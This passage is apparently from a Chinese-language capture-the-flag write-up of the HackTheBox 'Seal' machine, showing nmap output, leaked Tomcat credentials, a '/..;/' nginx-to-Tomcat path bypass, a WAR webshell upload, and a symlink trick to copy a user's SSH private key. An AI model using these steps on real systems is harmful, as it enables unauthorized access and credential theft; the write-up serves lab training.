class="hljs-number">-8859</span><span class="hljs-number">-1</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">71</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Bad</span> <span class="hljs-title class_">Message</span> <span class="hljs-number">400</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">reason</span>: <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">OTEXT</span><span class="hljs-operator">=</span><span class="hljs-number">0x80</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">RTSPRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">505</span> <span class="hljs-title class_">Unknown</span> <span class="hljs-title class_">Version</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span>iso<span class="hljs-number">-8859</span><span class="hljs-number">-1</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">58</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Bad</span> <span class="hljs-title class_">Message</span> <span class="hljs-number">505</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">reason</span>: <span class="hljs-title class_">Unknown</span> <span class="hljs-title class_">Version</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">Socks</span>4: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">400</span> <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">CNTL</span><span class="hljs-operator">=</span><span class="hljs-number">0x4</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span>iso<span class="hljs-number">-8859</span><span class="hljs-number">-1</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">69</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Bad</span> <span class="hljs-title class_">Message</span> <span class="hljs-number">400</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">reason</span>: <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">CNTL</span><span class="hljs-operator">=</span><span class="hljs-number">0x4</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">Socks</span>5: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">400</span> <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">CNTL</span><span class="hljs-operator">=</span><span class="hljs-number">0x5</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span>iso<span class="hljs-number">-8859</span><span class="hljs-number">-1</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">69</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>    <span class="hljs-operator">&lt;</span><span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Bad</span> <span class="hljs-title class_">Message</span> <span class="hljs-number">400</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">reason</span>: <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">CNTL</span><span class="hljs-operator">=</span><span class="hljs-number">0x5</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">auth</span>: <br><span class="hljs-operator">|</span> <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <span class="hljs-title class_">Unauthorized</span>\<span class="hljs-variable">x0D</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-title class_">Server</span> returned <span class="hljs-variable">status</span> <span class="hljs-number">401</span> <span class="hljs-variable">but</span> <span class="hljs-variable">no</span> <span class="hljs-variable">WWW</span><span class="hljs-operator">-</span><span class="hljs-title class_">Authenticate</span> <span class="hljs-variable">header</span>.<br><span class="hljs-operator">|</span> <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">methods</span>: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-title class_">Supported</span> <span class="hljs-title class_">Methods</span>: <span class="hljs-variable">GET</span> <span class="hljs-variable">HEAD</span> <span class="hljs-variable">POST</span> <span class="hljs-variable">OPTIONS</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">title</span>: <span class="hljs-title class_">Site</span> <span class="hljs-variable">doesn</span>&#x27;<span class="hljs-variable">t</span> <span class="hljs-variable">have</span> <span class="hljs-variable">a</span> <span class="hljs-title function_">title</span> (<span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">utf</span><span class="hljs-number">-8</span>).<br><span class="hljs-number">1</span> <span class="hljs-variable">service</span> <span class="hljs-variable">unrecognized</span> <span class="hljs-variable">despite</span> returning <span class="hljs-variable">data</span>. <span class="hljs-title class_">If</span> <span class="hljs-variable">you</span> <span class="hljs-variable">know</span> <span class="hljs-variable">the</span> <span class="hljs-variable">service</span>/<span class="hljs-variable">version</span>, <span class="hljs-variable">please</span> <span class="hljs-variable">submit</span> <span class="hljs-variable">the</span> <span class="hljs-variable">following</span> <span class="hljs-variable">fingerprint</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-variable">SF</span><span class="hljs-operator">-</span><span class="hljs-title class_">Port</span>8080<span class="hljs-operator">-</span><span class="hljs-variable">TCP</span>:<span class="hljs-variable">V</span><span class="hljs-operator">=</span><span class="hljs-number">7.91</span><span class="hljs-operator">%</span><span class="hljs-variable">I</span><span class="hljs-operator">=</span><span class="hljs-number">7</span><span class="hljs-operator">%</span><span class="hljs-variable">D</span><span class="hljs-operator">=</span><span class="hljs-number">12</span>/<span class="hljs-number">13</span><span class="hljs-operator">%</span><span class="hljs-title class_">Time</span><span class="hljs-operator">=</span><span class="hljs-number">61</span>B6A310<span class="hljs-operator">%</span><span class="hljs-variable">P</span><span class="hljs-operator">=</span><span class="hljs-variable">x86_64</span><span class="hljs-operator">-</span><span class="hljs-variable">pc</span><span class="hljs-operator">-</span><span class="hljs-variable">linux</span><span class="hljs-operator">-</span><span class="hljs-variable">gnu</span><span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-variable">G</span><br><span class="hljs-variable">SF</span>:<span class="hljs-variable">etRequest</span>,<span class="hljs-variable">F5</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>401<span class="hljs-char escape_">\x20</span>Unauthorized<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Mon,<span class="hljs-char escape_">\x20</span>13\x</span><br><span class="hljs-string">SF:20Dec<span class="hljs-char escape_">\x20</span>2021<span class="hljs-char escape_">\x20</span>01:34:08<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:<span class="hljs-char escape_">\x20</span>JSESSIONID=node09xtp</span><br><span class="hljs-string">SF:sxy6z9pabh0g6yyqtajg153\.node0;<span class="hljs-char escape_">\x20</span>Path=/;<span class="hljs-char escape_">\x20</span>HttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Expires:<span class="hljs-char escape_">\x20</span>T</span><br><span class="hljs-string">SF:hu,<span class="hljs-char escape_">\x20</span>01<span class="hljs-char escape_">\x20</span>Jan<span class="hljs-char escape_">\x20</span>1970<span class="hljs-char escape_">\x20</span>00:00:00<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/ht</span><br><span class="hljs-string">SF:ml;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">10</span>B,<span class="hljs-string">&quot;H</span><br><span class="hljs-string">SF:TTP/1\.1<span class="hljs-char escape_">\x20</span>200<span class="hljs-char escape_">\x20</span>OK<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Mon,<span class="hljs-char escape_">\x20</span>13<span class="hljs-char escape_">\x20</span>Dec<span class="hljs-char escape_">\x20</span>2021<span class="hljs-char escape_">\x20</span>01:34:09</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:<span class="hljs-char escape_">\x20</span>JSESSIONID=node01nxswyk2xedhj14uol8ldn80oh154</span><br><span class="hljs-string">SF:\.node0;<span class="hljs-char escape_">\x20</span>Path=/;<span class="hljs-char escape_">\x20</span>HttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Expires:<span class="hljs-char escape_">\x20</span>Thu,<span class="hljs-char escape_">\x20</span>01<span class="hljs-char escape_">\x20</span>Jan<span class="hljs-char escape_">\x20</span>197</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\x20</span>00:00:00<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>All</span><br><span class="hljs-string">SF:ow:<span class="hljs-char escape_">\x20</span>GET,HEAD,POST,OPTIONS<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRe</span><br><span class="hljs-variable">SF</span>:<span class="hljs-variable">quest</span>,<span class="hljs-variable">AD</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>505<span class="hljs-char escape_">\x20</span>Unknown<span class="hljs-char escape_">\x20</span>Version<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>te</span><br><span class="hljs-string">SF:xt/html;charset=iso-8859-1<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>58<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>c</span><br><span class="hljs-string">SF:lose<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;h1&gt;Bad<span class="hljs-char escape_">\x20</span>Message<span class="hljs-char escape_">\x20</span>505&lt;/h1&gt;&lt;pre&gt;reason:<span class="hljs-char escape_">\x20</span>Unknown<span class="hljs-char escape_">\x20</span>Ve</span><br><span class="hljs-string">SF:rsion&lt;/pre&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-variable">F5</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>401<span class="hljs-char escape_">\x20</span>Unauthorized\</span><br><span class="hljs-string">SF:r<span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Mon,<span class="hljs-char escape_">\x20</span>13<span class="hljs-char escape_">\x20</span>Dec<span class="hljs-char escape_">\x20</span>2021<span class="hljs-char escape_">\x20</span>01:34:13<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>JSESSIONID=node0z5n4sbc9hnjors2ulsqy6jnq155\.node0;<span class="hljs-char escape_">\x20</span>Path=/;<span class="hljs-char escape_">\x20</span>H</span><br><span class="hljs-string">SF:ttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Expires:<span class="hljs-char escape_">\x20</span>Thu,<span class="hljs-char escape_">\x20</span>01<span class="hljs-char escape_">\x20</span>Jan<span class="hljs-char escape_">\x20</span>1970<span class="hljs-char escape_">\x20</span>00:00:00<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span></span><br><span class="hljs-string">SF:Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span>\</span><br><span class="hljs-string">SF:n&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>5,<span class="hljs-variable">C3</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>character<span class="hljs-char escape_">\x20</span>CNTL=0x5<span class="hljs-char escape_">\r</span></span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=iso-8859-1<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>6</span><br><span class="hljs-string">SF:9<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;h1&gt;Bad<span class="hljs-char escape_">\x20</span>Message<span class="hljs-char escape_">\x20</span>400&lt;/h1&gt;&lt;pre&gt;rea</span><br><span class="hljs-string">SF:son:<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>character<span class="hljs-char escape_">\x20</span>CNTL=0x5&lt;/pre&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>4,<span class="hljs-variable">C3</span>,<span class="hljs-string">&quot;HTTP/1\.1</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>character<span class="hljs-char escape_">\x20</span>CNTL=0x4<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/ht</span><br><span class="hljs-string">SF:ml;charset=iso-8859-1<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>69<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close\</span><br><span class="hljs-string">SF:r<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;h1&gt;Bad<span class="hljs-char escape_">\x20</span>Message<span class="hljs-char escape_">\x20</span>400&lt;/h1&gt;&lt;pre&gt;reason:<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>charact</span><br><span class="hljs-string">SF:er<span class="hljs-char escape_">\x20</span>CNTL=0x4&lt;/pre&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RPCCheck</span>,<span class="hljs-variable">C7</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>ch</span><br><span class="hljs-string">SF:aracter<span class="hljs-char escape_">\x20</span>OTEXT=0x80<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=iso-8859-1\</span><br><span class="hljs-string">SF:r<span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>71<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;h1&gt;Bad<span class="hljs-char escape_">\x20</span>Mess</span><br><span class="hljs-string">SF:age<span class="hljs-char escape_">\x20</span>400&lt;/h1&gt;&lt;pre&gt;reason:<span class="hljs-char escape_">\x20</span>Illegal<span class="hljs-char escape_">\x20</span>character<span class="hljs-char escape_">\x20</span>OTEXT=0x80&lt;/pre&gt;</span><br><span class="hljs-string">SF:&quot;</span>);<br><span class="hljs-title class_">Service</span> <span class="hljs-title class_">Info</span>: <span class="hljs-variable">OS</span>: <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">CPE</span>: <span class="hljs-variable">cpe</span>:/<span class="hljs-variable">o</span>:<span class="hljs-variable">linux</span>:<span class="hljs-variable">linux_kernel</span><br><br><span class="hljs-variable">NSE</span>: <span class="hljs-title class_">Script</span> <span class="hljs-title class_">Post</span><span class="hljs-operator">-</span><span class="hljs-variable">scanning</span>.<br><span class="hljs-title class_">Initiating</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span><br><span class="hljs-title class_">Completed</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span>, <span class="hljs-number">0.00</span>s <span class="hljs-variable">elapsed</span><br><span class="hljs-title class_">Initiating</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span><br><span class="hljs-title class_">Completed</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span>, <span class="hljs-number">0.00</span>s <span class="hljs-variable">elapsed</span><br><span class="hljs-title class_">Initiating</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span><br><span class="hljs-title class_">Completed</span> <span class="hljs-variable">NSE</span> <span class="hljs-variable">at</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span>, <span class="hljs-number">0.00</span>s <span class="hljs-variable">elapsed</span><br><span class="hljs-title class_">Read</span> <span class="hljs-variable">data</span> <span class="hljs-variable">files</span> <span class="hljs-variable">from</span>: /<span class="hljs-variable">usr</span>/<span class="hljs-variable">bin</span>/<span class="hljs-operator">..</span>/<span class="hljs-variable">share</span>/<span class="hljs-variable">nmap</span><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">143.32</span> <span class="hljs-variable">seconds</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h1><p>可以发现有两个WEB界面，分别如下。一个是gitbucket，另一个是一个商店一样的seal market：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213093829708.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213093829708"></p>
+<p>同时还能收集到一个邮箱（后面发现也没啥用）：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213094036799.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213094036799"></p>
+<p>在gitbucket中能够看到一个seal的repo，查看其中tomcat配置文件<code>tomcat-user.xml</code>的git变更记录，发现存留的用户名和密码，记录一下：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213103229142.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213103229142"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;tomcat&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;42MrHBf*z8&#123;Z%&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;manager-gui,admin-gui&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>之后尝试使用该凭据信息进入tomcat控制台上传war包。首先是使用dirsearch扫一下目录：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213122223530.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213122223530"></p>
+<p>可以发现本该是控制台的<code>/manager/html</code>是403，访问该界面能够看到nginx的界面。不难推测是nginx是作为反向代理服务器，之后流量才转发给后端的tomcat。且nginx的location块应该作了相应的配置从而使得不能访问控制台。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213123304807.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213123304807"></p>
+<p>那就是需要想办法绕过了，其实现阶段爆出的很多漏洞中，反向代理在解析的时候和后端出现不一致的情况经常是会被拿来做文章的地方。据此搜索的话，最终我们能够找到一个目录穿越漏洞。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213123401130.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213123401130"></p>
+<p>第一个AWVS的链接中，我们可以发现一个存在不一致的情况。大体就是tomcat会将<code>/..;/</code>解析成传统意义上的<code>/../</code>，而nginx不会。所以nginx放过了本该拦截的URL访问，这样我们就能进入控制台了。</p>
+<blockquote>
+<p>Web servers and reverse proxies normalize the request path. For example, the path <strong>&#x2F;image&#x2F;..&#x2F;image&#x2F;</strong> is normalized to <strong>&#x2F;images&#x2F;</strong>. When Apache Tomcat is used together with a reverse proxy such as nginx there is a nromalization inconsistency.</p>
+<p>Tomcat will threat the sequence <strong>&#x2F;..;&#x2F;</strong> as <strong>&#x2F;..&#x2F;</strong> and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.</p>
+<p>This allows an attacker to access Apache Tomcat resources that are not normally accessible via the reverse proxy mapping.</p>
+</blockquote>
+<p>如上，我们访问如下链接就能进入tomcat的管理员界面：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.250</span><span class="hljs-regexp">/manager/</span>status<span class="hljs-regexp">/..;/</span>html<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213183540308.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213183540308"></p>
+<p>之后就是非常传统的通过上传war包getshell了，需要注意的是在上传时候访问的URL依旧需要抓包改包，否则依然会是403.</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213184203717.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213184203717"></p>
+<p>这里传的是冰蝎马，经过测试平常默认使用的jsp冰蝎马会解析错误。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213195314377.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213195314377"></p>
+<p>换了一个低版本的java9的jsp webshell就行了。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213194049298.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213194049298"></p>
+<p>拿到shell后首先敲下命令看下权限，发现是非常普通的tomcat。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213195352058.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213195352058"></p>
+<h1 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h1><p>逛了一圈没有发现比较特殊的东西，ssh私钥也读不了。遂上传linpeas脚本后运行，发现网站的备份文件。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213201832397.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213201832397"></p>
+<p>在backup目录下发现playbook配置文件，可以发现有一个copy_link的敏感配置，这是我们可以利用的突破口。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/Seal.assets/image-20211213213033000.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211213213033000"></p>
+<p>我们可以创建一个软连接，指向luis用户的ssh私钥，这样备份的时候就能复制出来了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s  /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa<br></code></pre></td></tr></table></figure>
+
+
+
+<p>用冰蝎将文件下载到本地，解压打开即可拿到用户luis的私钥。</p>
